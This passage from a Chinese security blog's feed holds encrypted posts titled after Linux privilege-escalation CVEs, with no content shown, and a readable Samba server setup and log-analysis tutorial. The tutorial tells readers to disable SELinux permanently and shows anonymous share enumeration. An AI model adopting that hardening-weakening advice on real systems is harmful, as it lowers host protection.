f5a67b7c1b01792aa26bd5c67578bd9fde8a1412d969d5f55eb16e951b15839c0c76f923413768a90ffcb58ddfa20848679b963e9c2c45ca77b4a48e03d7734ab435986f50fd2cad88a5e2fc73d2e06342beec26f35a10391cefacc3e1f7a3078e862c53ca52495b08732a06bce429224c9ca7a95c08fd6e335699041c4d7e4d373807e9efb709b401f7ebac14c32fb6661aa5f203d4fe34d8abc5417e46f26e0b63a5b45d6e1802bacfaed53a228ee3fb17a6bf3e172613f5aa54b096d49d8e27df48d4bbaab3f2b8e67736c62eab684b1d367aa42a48528450f5e277bae0dfd494eda8018b7372c3bfbddd364ceae0656dad1de3352a137dabab45529720e1ff55031d0205a2b900a17e0495ba7256af31732dc5abb3238013d620e27465d78384bceeb68e7c6cdc1196f2587a2bac4e6fe95047d943c526244a4ea6a52381ad6d522207dc2675b92675fbff6b7d9301a78f341e9c1dd97f8b0288031d8e1fd6664a763848ae4df05228503a8caea1ca9cdb1665f5fa6896737f582f8a694cada260afa5b53895ea56d37cb2b5c37c3bba7dd0aba457ad443fef57b7d366b253b304f5aa6b7b7a98de08a953f36aa79cfa676d0d6fd58dad666cb445d6aec751d9e69c02bb62a168235d875fd67d2a9b442b69ca84796d54f3f32da7bdb2dc8db3526a53547a9377231023ea8d3b98b441d466a85082e6900f9335b07dc5483940fbc4b0a39b2a12d855708112a869784898b8ec1ba3320c3bf33d38f2cf67c7699b0436f82156a46f2b75cbc22859b4501c4a74139c9327cfad8ebe915e5854e83b87c1766be6362c6b2081547cc00e6fec4aeb38b02e0ec8c6ae85860fb3a5def7a21bc4510c80e9b141e1f72857272566df31d7a7199d3394606c4130ab00a312248a0500f73388551ab2e172cb757cc3ba5982880c5dba1fb88e2ed52f48a4ac48bb5b438c9bb1828a66ba9ae93ffa6a08a8ccd3bfef10682b3dec605e47ceb23d5bbaa32ea3ac591eef9a3a0a5f5643f5f1a70929de7b6988da9bcf2a4d91c868d7e07c02f7256530efff8b35c638bea39cb2871174d262cfec7ded47ef85b4f5ac890ad6149855bf19bb5ef1c210d8abeea293f7296d45288451a3c60e600523e67726b75b3bd1b783c0f4725e27f1d51eaf2ee3ed3264d3ec70b7559df84b2d947b655e1c4569861a6f245504b63b58d3a3860f7d9ced62154cafe1da88986754c9731696c3d46d2d76662df8b96740baee1ece02828f3028f92ec21fb0f1b361e4148f3125c5df07e48daa1bb2db42309e4feffc058e4cba248fab294cd32b406868164b77f7f539676c713fefe05acfaa7545d4757cc61574df9b0f909c3737b3f58aec3e717a1924b5f565c2fd74e1b61105659548fc21eb43af2ca521b7da377a0eeb24d04393ed73ac6e93f514b902f76ea36ebcfa0fb83f835cce05ef5773abe55751293ea55ba364f5b5722f1d76969f5d120b2b5dcc629f14e4cbd1cdd7cf3b871b0b5cd0bd95d719a5749e7e7705b49da69abcbf6d608f821112a534b64f6f799deac191a158f6663b4cb7a774348c397503f11c7294d29ca82a5a954206640b77b53937a061b586644ee6adc6438820439b0e66a1eee76deb015c75383396492afe2ae6082c7ea1d6f11c8fcd844895c32bd5579356d2ae47e8b838102ac2099d35b98a52d36c3ca64e1a7d13566e82150a4a2809116317613aa213cad53406055bfbf231c909dab510e14e81ac669839e2321600090b44d3f7a40762dccf9de12fdf7e4f5c3e9371b62d9500b9319e762429ec7e641261a606733f25c007361b1c9c6dba0d6e54750f01d7741714c3a94a452386fac492b374b00822c69855d20a22e5c42e05b2022bc5a020c97074e06a1130aeb0d26290728e12f2a06f12f9e242b59b737fe7924b8b2286d48ca46a07621b854d9be17583756de21cba857c933f7c3ee69cba7e5c91781f39eb882731f8a949921e047fd7cffe8f456049acebb477ae5615bf457fc120f5aacddff3bbb057985bcf2adbdabdeaf0e553472dabe17a68e02f2c21bbd93f998f45ba69cc8cf4ef5a633a786cc6d0d5bc4f63874457f7741f55efc490953feb930da01574d3661772726738311fd4b035896606d92cf6d33d696837429ae8ff13be06ccd4fc7eada09dceffd3056a6b26d3354a6a9d1b17f584893c784dcf199cc80195f8dca01a6d5cc28c3b658c4ca4b7438d3131f849a5702b18b45c753dace3939cb7260a47ca9e336c9f2b0534f1b5809c19fc8ed7c9300c10f1c7f7859ae5972d9bfc8479de8fc8e86c69eb22d569ec926b79efce83c4189030a53ae181ef7ff2eb239bc48c88ff389d30faa4f94399aa08bfc96bb3d4e9c6613aa07bf2d3d3048c432afcd868d52bed1bc16afc934d006036db358be41aa94b313b114f6f1c829fc738035adebce23f2c420e5085542c48d31df1d831049e9f88c98855da835480950b746aa49b06af9a5183a6d7c44aa50b5cd48051551d6e8fc815e3da56a2cf67463763619fb5709a45e2f01c3be610c36985c9a2aa967d4c1c25af7a1081a15cec3cad0d17ba2a240faedc086f87629a2a766cd652810db145381f6c438aaffda5012e17a77844615749692bd0f49dd716647de45a4a2442971592feddf414227b3e1fe34560ccf2468f3dbd320396412f1edc7db24fa85f49dc2f2aad8defc2815cc6d63e88ebd68221d550e5c0b6bc105cc5502b5bb4aa20752dc46fb26f44321a9a71bd50091e436ab04c06e4b155f2e7f79b3b4517145096b89f06c59da60e98bf7b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-1000001</title>
      <link href="/p/2762ae73.html"/>
      <url>/p/2762ae73.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5cc69e9cb344da3a06d4afd8e80bacef0e0b69495f27eb2cf9d649c9cf96d220"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-18955</title>
      <link href="/p/fdcce46a.html"/>
      <url>/p/fdcce46a.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d281e00097882d3dbeeac3f5df0a2361d43f4c166f1b65d14d3f959ccbfd3c66"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-13272</title>
      <link href="/p/2cbd701f.html"/>
      <url>/p/2cbd701f.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e54215951f24d65af8f6d8a47ba874cc5cca6fc3a311e4f8ac1ef74147e49cf4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Samba服务器</title>
      <link href="/p/9eb93f46.html"/>
      <url>/p/9eb93f46.html</url>
      
        <content type="html"><![CDATA[<p>Samba是一个能让Linux系统应用Microsoft网络通讯协议的软件，而SMB是<strong>Server Message Block</strong>的缩写，即为服务器消息块 ，SMB主要是作为Microsoft的网络通讯协议，后来Samba将SMB通信协议应用到了Linux系统上，就形成了现在的Samba软件。后来微软又把 SMB 改名为 CIFS（Common Internet File System），即公共 Internet 文件系统，较多的用在了Linux与windows之间的数据共享上面。</p><h2 id="常见应用"><a href="#常见应用" class="headerlink" title="常见应用"></a>常见应用</h2><ul><li>分享档案与打印机服务；</li><li>可以提供用户登入 SAMBA 主机时的身份认证，以提供不同身份者的个别数据；</li><li>可以进行 Windows 网络上的主机名解析 (NetBIOS name)</li><li>可以进行装置的分享 (例如 Zip, CDROM…)</li></ul><h2 id="Samba使用的-damons："><a href="#Samba使用的-damons：" class="headerlink" title="Samba使用的 damons："></a>Samba使用的 damons：</h2><p><strong>NetBIOS 机器间的沟通</strong></p><ul><li>取得对方主机的NetBIOS name 定位该主机所在：</li><li>利用对方给予权限存取可用资源</li></ul><p><strong>SAMBA 使用下面两个服务来控制上面两步骤</strong>，分别是：</p><ul><li>nmbd<ul><li>这个daemon是用来管理工作组，NetBIOS name等等的解析。</li><li>主要利用 UDP 协议开启 port 137 138 来负责名称解析的任务。</li></ul></li><li>smbd<ul><li>这个daemon主要用来管理SAMBA主机分享的目录，档案与打印机等等。</li><li>主要利用可靠的TCP协议来传输数据，开放端口为139.</li></ul></li></ul><p>所以SAMBA每次启动至少都需要有这个daemon，而当我启动了SAMBA之后，主机系统就会<strong>启动137,138 这两个UDP 及139这个TCP</strong>端口。</p><h2 id="Samba联机方式"><a href="#Samba联机方式" class="headerlink" title="Samba联机方式"></a>Samba联机方式</h2><h3 id="peer-peer-对等模式"><a href="#peer-peer-对等模式" class="headerlink" title="peer/peer(对等模式)"></a>peer/peer(对等模式)</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/model_peer.gif" alt="peer/peer 联机的示意图"></p><p>优点：每部计算机均可以独立运作，而不受他人的影响</p><p>缺点：当整个网域内的所有人员都要进行数据分享时，需知道所有计算机里面的账号与密码。</p><p>比较适合</p><ol><li>小型的网域</li><li>没有需要常常进行档案数据分享的网络环境</li><li>每个使用者都独自拥有该计算机的拥有权(该计算机是用户的，而不是公用的！)</li></ol><h3 id="domain-model（主控模式）"><a href="#domain-model（主控模式）" class="headerlink" title="domain model（主控模式）"></a>domain model（主控模式）</h3><p>将所有的账号与密码都放置在一部主控计算机 (Primary Domain Controller, PDC) 上面，在我的网域里面，任何人想要使用任何计算机时，都需要在屏幕前方输入账号与密码，然后通通藉由 PDC 服务器的辨识后，才给予适当的权限。也就是说，不同的身份还具有不一样的计算机资源权限。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/model_domain.gif" alt="domain model 联机的示意图"></p><h2 id="Samba服务器搭建"><a href="#Samba服务器搭建" class="headerlink" title="Samba服务器搭建"></a>Samba服务器搭建</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum -y install samba*</span><br><span class="line">systemctl start smb</span><br><span class="line">systemctl enable smb</span><br><span class="line">firewall-cmd --permanent --add-service=samba</span><br><span class="line">getenforce ##可以显示当前SELinux的应用模式，是强制、执行还是停用</span><br><span class="line"><span class="meta">#</span><span class="bash">Permissive</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的getenforce结果一定要是Permissive 不然<code>selinux</code>可能会阻止了进程</p><p><code>setenforce 0</code> 临时关闭</p><p><code>vim /etc/sysconfig/selinux</code> 永久关闭</p><p><code>\#SELINUX=enforcing</code> </p><p><code>SELINUX=disabled</code></p></blockquote><h3 id="Samba软件"><a href="#Samba软件" class="headerlink" title="Samba软件"></a>Samba软件</h3><p><code>samba-common</code>主要提供samba服务器的设置文件与设置文件语法检验程序testparm</p><p><code>samba-client</code>客户端软件，主要提供linux主机作为客户端时，所需要的工具指令集</p><p><code>samba-swat</code>基于https协议的samba服务器web配置界面</p><p><code>samba</code>服务器端软件，主要提供samba服务器的守护程序，共享文档，日志的轮替，开机默认选项Samba服务器安装完毕，会生成配置文件目录<code>/etc/samba</code>和其它一些samba可执行命令工具，<code>/etc/samba/smb.conf</code>是samba的核心配置文件。</p><h3 id="Samba服务的配置文件"><a href="#Samba服务的配置文件" class="headerlink" title="Samba服务的配置文件"></a>Samba服务的配置文件</h3><p><code>/etc/samba/smb.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[global] #全局参数</span><br><span class="line">        workgroup = SAMBA#定义工作组</span><br><span class="line">        security = user#安装验证方式，共4种user、share、server、domain</span><br><span class="line"></span><br><span class="line">        passdb backend = tdbsam#定义用户后台类型，总共有3种smbpasswd、tdbsam、ldapsam</span><br><span class="line"></span><br><span class="line">        printing = cups#设置在Samba服务启动时是否共享打印机设备</span><br><span class="line">        printcap name = cups</span><br><span class="line">        load printers = yes</span><br><span class="line">        cups options = raw#打印机的选项</span><br><span class="line">        </span><br><span class="line">        server string = Samba Server Version %v #服务器提示字符，默认显示samba版本</span><br><span class="line">        log file = /var/log/samba/log.%m #定义日志文件</span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">        comment = Home Directories#描述信息</span><br><span class="line">        valid users = %S, %D%w%S#有效访问用户</span><br><span class="line">        browseable = No#指定共享目录是否可以被浏览</span><br><span class="line">        read only = No#是否只读</span><br><span class="line">        inherit acls = Yes</span><br><span class="line"></span><br><span class="line">[printers]</span><br><span class="line">        comment = All Printers</span><br><span class="line">        path = /var/tmp#共享文件的实际路径。</span><br><span class="line">        printable = Yes</span><br><span class="line">        create mask = 0600</span><br><span class="line">        browseable = No</span><br><span class="line"></span><br><span class="line">[print$]</span><br><span class="line">        comment = Printer Drivers</span><br><span class="line">        path = /var/lib/samba/drivers</span><br><span class="line">        write list = @printadmin root</span><br><span class="line">        force group = @printadmin</span><br><span class="line">        create mask = 0664</span><br><span class="line">        directory mask = 0775</span><br><span class="line">        </span><br><span class="line">[common]       #共享名称为common</span><br><span class="line">    comment = Common share</span><br><span class="line">    path = /common        #指定共享目录</span><br><span class="line">    valid users = tom jerry    #有效账户列表</span><br><span class="line">    create mask = 0750        #客户端上传文件的默认权限</span><br><span class="line">    directorymask = 0775       #客户端创建目录的默认权限 </span><br><span class="line">    browseable = yes       #客户端是否对所有人可见    </span><br><span class="line">    writable= no          #是否允许写入</span><br><span class="line">    write list = tom       #写权限账户列表</span><br><span class="line">    admin users = tom       #该共享的管理员，具有完全权限</span><br><span class="line">    invalid users = root bin    #禁止root与bin访问common共享</span><br><span class="line">    guest ok = no       #是否允许匿名访问</span><br></pre></td></tr></table></figure><h4 id="主要配置参数-global"><a href="#主要配置参数-global" class="headerlink" title="主要配置参数-[global]"></a>主要配置参数-[global]</h4><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>workgroup = WORKGROUP</td><td>设定Samba Server所要加入的工作组或域</td></tr><tr><td>server string = Samba Server Version %v</td><td>设定 Samba Server 的注释，%v表示显示Samba的版本号</td></tr><tr><td>netbios name = smbserver</td><td>设置Samba Server的NetBIOS名称</td></tr><tr><td>interfaces = lo eth0 192.168.12.2/24 192.168.13.2/24</td><td>说明：设置Samba Server监听哪些网卡，可以写网卡名，也可以写该网卡的IP地址。</td></tr><tr><td>hosts allow = 127. 192.168.1. 192.168.10.1</td><td>表示允许连接到Samba Server的客户端，多个参数以空格隔开，hosts deny 与hosts allow 刚好相反。</td></tr><tr><td>hosts allow=@example.com</td><td>表示允许来自example.com网域的所有计算机连接</td></tr><tr><td>hosts allow=172.17.2.EXCEPT172.17.2.50</td><td>表示容许来自172.17.2.*的主机连接，但排除172.17.2.50</td></tr><tr><td>max connections = 0</td><td>max connections用来指定连接Samba Server的最大连接数目。如果超出连接数目，则新的连接请求将被拒绝。0表示不限制</td></tr><tr><td><strong>log file = /var/log/samba/log.%m</strong></td><td>设置Samba Server日志文件的存储位置以及日志文件名称。在文件名后加个<code>%m</code>（主机名），表示对每台访问Samba Server的机器都单独记录一个日志文件。</td></tr><tr><td>max log size = 50</td><td>设置Samba Server日志文件的最大容量，单位为kB，0代表不限制</td></tr><tr><td><strong>encrypt passwords = yes/no</strong></td><td>是否将认证密码加密</td></tr><tr><td>smb passwd file = /etc/samba/smbpasswd</td><td>如果之前设置的是smbpasswd模式的话</td></tr><tr><td><strong>username map = /etc/samba/smbusers</strong></td><td>用来定义用户名映射，比如可以将root换成administrator、admin等。不过要事先在smbusers文件中定义好。比如：root = administrator admin，这样就可以用administrator或admin这两个用户来代替root登陆Samba Server，更贴近windows用户的习惯。</td></tr><tr><td><strong>guest account = nobody</strong></td><td>用来设置guest用户名。</td></tr><tr><td><strong>load printers = yes/no</strong></td><td>设置是否在启动Samba时就共享打印机。</td></tr><tr><td><strong>printcap name = cups</strong></td><td>设置共享打印机的配置文件。</td></tr><tr><td><strong>printing = cups</strong></td><td>设置Samba共享打印机的类型</td></tr></tbody></table><p><strong>security = user</strong></p><ul><li><code>share</code>不需要提供用户名和口令</li><li><code>user</code>共享目录只能被授权的用户访问，密码要在本Samba Server中建立</li><li><code>server</code>依靠其他Windows NT/2000或Samba Server来验证用户的账号和密码,是一种代理验证。</li><li><code>domain</code>域安全级别,使用主域控制器(PDC)来完成认证</li></ul><p><strong>passdb backend = tdbsam</strong></p><p><code>passdb backend</code>表示用户后台，有三种后台：<code>smbpasswd</code>、<code>tdbsam</code>和<code>ldapsam</code></p><p><code>sam</code>表示<code>security account manager</code>（安全账户管理）</p><p><code>smbpasswd</code>：该方式是使用smb自己的工具smbpasswd来给系统用户（真实用户或者虚拟用户）设置一个Samba密码，客户端就用这个密码来访问Samba的资源。smbpasswd文件默认在<code>/etc/samba</code>目录下，不过有时候要手工建立该文件。</p><p><code>tdbsam</code>：该方式则是使用一个数据库文件来建立用户数据库。数据库文件<code>/etc/samba/passdb.tdb</code>。要建立的<strong>Samba用户必须先是系统用户</strong>。我们也可以使用pdbedit命令来建立Samba账户。</p><p>创建删除Samba账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pdbedit –a username#创建</span><br><span class="line">pdbedit –x username</span><br></pre></td></tr></table></figure><p>列出Samba用户列表，读取passdb.tdb数据库文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdbedit –L</span><br></pre></td></tr></table></figure><p>列出Samba用户列表的详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdbedit -Lv</span><br></pre></td></tr></table></figure><p>暂停该Samba用户的账号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdbedit -c &quot;[]&quot; -u u</span><br></pre></td></tr></table></figure><p>恢复该Samba用户的账号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdbedit –c &quot;[]&quot; –u username</span><br></pre></td></tr></table></figure><p><code>ldapsam</code>该方式则是基于LDAP的账户管理方式来验证用户。首先要建立LDAP服务，然后设置<code>passdb backend = ldapsam:ldap://LDAP Server</code></p><h4 id="主要配置参数-Share"><a href="#主要配置参数-Share" class="headerlink" title="主要配置参数-[Share]"></a>主要配置参数-[Share]</h4><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><strong>comment = 任意字符串</strong></td><td>comment是对该共享的描述</td></tr><tr><td><strong>path = 共享目录路径</strong></td><td><code>/home/share/</code>下为每个Linux用户以他的用户名建个目录，作为他的共享目录，这样path就可以写成：<code>path = /home/share/%u</code></td></tr><tr><td><code>path= /home/share/%m</code></td><td>为网络上每台可以访问samba的机器都各自建个以它的netbios名的路径</td></tr><tr><td><strong>browseable = yes/no</strong></td><td>指定该共享是否可以浏览</td></tr><tr><td><strong>writable = yes/no</strong></td><td>该共享路径是否可写</td></tr><tr><td><strong>available = yes/no</strong></td><td>指定该共享资源是否可用</td></tr><tr><td><strong>admin users = 该共享的管理者</strong></td><td><code>admin users =david，sandy</code>（多个用户中间用逗号隔开）</td></tr><tr><td><strong>valid users =</strong></td><td><strong>允许访问该共享的用户</strong></td></tr><tr><td><strong>invalid users =</strong></td><td><strong>禁止访问该共享的用户</strong></td></tr><tr><td><strong>write list =</strong></td><td><strong>允许写入该共享的用户</strong></td></tr></tbody></table><h2 id="创建共享目录"><a href="#创建共享目录" class="headerlink" title="创建共享目录"></a>创建共享目录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradd -s /sbin/nologin testuserh</span><br><span class="line">useradd -s /sbin/nologin testuserl</span><br><span class="line">pdbedit -a testuserh</span><br><span class="line">pdbedit -a testuserl</span><br><span class="line">pdbedit -L</span><br><span class="line">mkdir /common</span><br><span class="line">echo &quot;hello world!&quot; &gt; /common/test.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">        path = /common</span><br><span class="line">        public = yes</span><br><span class="line">        browseable = yes</span><br><span class="line">        write list = testuserh</span><br></pre></td></tr></table></figure><h2 id="linux挂载smb共享目录"><a href="#linux挂载smb共享目录" class="headerlink" title="linux挂载smb共享目录"></a>linux挂载smb共享目录</h2><p>安装：<code>yum -y install samba-client cifs-utils</code></p><p>匿名查看smb服务器共享的目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.77.199 -N</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210910161807563.png" alt="image-20210910161807563"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.201.147/common -U testuserh</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210911181952978.png" alt="image-20210911181952978"></p><h2 id="NT-STATUS-ACCESS-DENIED-opening-remote-file-xxx-exe"><a href="#NT-STATUS-ACCESS-DENIED-opening-remote-file-xxx-exe" class="headerlink" title="NT_STATUS_ACCESS_DENIED opening remote file \xxx.exe"></a>NT_STATUS_ACCESS_DENIED opening remote file \xxx.exe</h2><mark class="hl-label pink">重要！！！</mark>  要想使用户可以上传和删除文件，除了系统当中的定义的允许写操作外，目录文件系统也要有写权限才可以<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setfacl -m u:testuserh:rwx /common</span><br><span class="line">[root@localhost ~]# getfacl /common/</span><br><span class="line">getfacl: Removing leading &#x27;/&#x27; from absolute path names</span><br><span class="line"><span class="meta">#</span><span class="bash"> file: common/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> owner: root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> group: root</span></span><br><span class="line">user::rwx</span><br><span class="line">user:testuserh:rwx</span><br><span class="line">group::r-x</span><br><span class="line">mask::rwx</span><br><span class="line">other::r-x</span><br><span class="line">netstat –na |grep ESTABLISHED</span><br></pre></td></tr></table></figure><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a><a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#LOGLEVEL">配置</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Default: log level = 0</span><br><span class="line"></span><br><span class="line">Example: log level = 3 passdb:5 auth:10 winbind:2</span><br><span class="line"></span><br><span class="line">Example: log level = 1 full_audit:1@/var/log/audit.log winbind:2</span><br><span class="line"></span><br><span class="line">log level = 1 auth:3 #以下参考这个配置</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">all。该参数是可选的：如果您不指定额外的关键字，假定使用 all。</span><br><span class="line">tdb。与不重要的数据库相关的日志消息，这是 Samba 使用的键值存储。</span><br><span class="line">printdrivers。打印机驱动程序管理例程。</span><br><span class="line">lanman。 NT LAN Manager 调试。</span><br><span class="line">smb。 SMB 协议调试。</span><br><span class="line">rpc_parse。远程过程调用（RPCs）解析。</span><br><span class="line">rpc_srv。服务器端 RPCs。</span><br><span class="line">rpc_cli。客户端 RPCs。</span><br><span class="line">passdb。在 Samba 主机上存储密码的旧有方式。</span><br><span class="line">sam。本地 Samba 帐户数据库。</span><br><span class="line">auth。Samba 内与用户身份验证相关的各个模块。</span><br><span class="line">winbind。用于允许Microsoft用户透明地登录到UNIX系统的组件。</span><br><span class="line">vfs。为 Virtual File System 模块调试消息，允许您通过可插入模块添加功能到Samba。</span><br><span class="line">idmap。在UNIX 用户IDs与Microsoft安全标识符之间映射身份。</span><br><span class="line">quota。与配额处理相关的消息，同时由Microsoft Windows NT策略和UNIX文件系统处理。</span><br><span class="line">acls。访问控制列表处理。</span><br><span class="line">locking。文件锁定状态和错误。</span><br><span class="line">msdfs。与 Samba 的分布式文件系统支持相关的日志消息。</span><br><span class="line">dmapi。数据管理应用程序编程接口（API）功能。必须使用第三方DMAPI实现编译Samba来使用该功能。</span><br><span class="line">registry。Windows 注册表的模仿。</span><br></pre></td></tr></table></figure><p>成功登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[2021/09/11 03:58:39.242932,  2] ../../source3/auth/auth.c:329(auth_check_ntlm_password)</span><br><span class="line">  check_ntlm_password:  authentication for user [testuserh] -&gt; [testuserh] -&gt; [testuserh] succeeded</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210911190147619.png" alt="image-20210911190147619"></p><p>失败登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[2021/09/11 04:05:06.906891,  3] 